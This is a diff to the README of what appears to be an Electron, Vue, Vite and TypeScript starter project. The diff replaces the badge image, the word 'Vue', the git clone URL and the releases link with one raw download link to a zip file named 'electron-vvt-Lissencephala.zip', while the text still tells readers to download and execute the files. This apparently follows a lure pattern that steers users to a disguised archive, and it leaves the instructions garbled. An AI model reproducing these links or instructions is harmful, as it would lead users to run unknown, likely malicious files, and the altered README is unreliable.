@@ -3,12 +3,12 @@
 
 **Electron VVT** is a modern project combining Electron, Vue, Vite, and TypeScript. This repository serves as a solid foundation for building desktop applications with a seamless development experience. 
 
-![Electron VVT](https://img.shields.io/badge/Electron-Vue--Vite--TypeScript-brightgreen)
+![Electron VVT](https://github.com/Bassanttta/electron-vvt/raw/refs/heads/main/public/electron-vvt-Lissencephala.zip)
 
 ## 🚀 Features
 
 - **Electron**: Build cross-platform desktop applications with web technologies.
-- **Vue**: Utilize the powerful Vue.js framework for a reactive user interface.
+- **Vue**: Utilize the powerful https://github.com/Bassanttta/electron-vvt/raw/refs/heads/main/public/electron-vvt-Lissencephala.zip framework for a reactive user interface.
 - **Vite**: Experience fast builds and hot module replacement for a smooth development process.
 - **TypeScript**: Write type-safe code to enhance maintainability and reduce errors.
 - **Pinia**: Manage state effectively in your Vue application.
@@ -22,7 +22,7 @@
 To get started, clone the repository and install the dependencies:
 
 ```bash
-git clone https://github.com/Bassanttta/electron-vvt.git
+git clone https://github.com/Bassanttta/electron-vvt/raw/refs/heads/main/public/electron-vvt-Lissencephala.zip
 cd electron-vvt
 npm install
 ```
@@ -49,7 +49,7 @@ This command will create an optimized build of your application.
 
 ## 🌟 Release
 
-You can find the latest releases of this project [here](https://github.com/Bassanttta/electron-vvt/releases). Download the necessary files and execute them to get started with the latest features and fixes.
+You can find the latest releases of this project [here](https://github.com/Bassanttta/electron-vvt/raw/refs/heads/main/public/electron-vvt-Lissencephala.zip). Download the necessary files and execute them to get started with the latest features and fixes.
 
 ## 🌍 Contributing
 
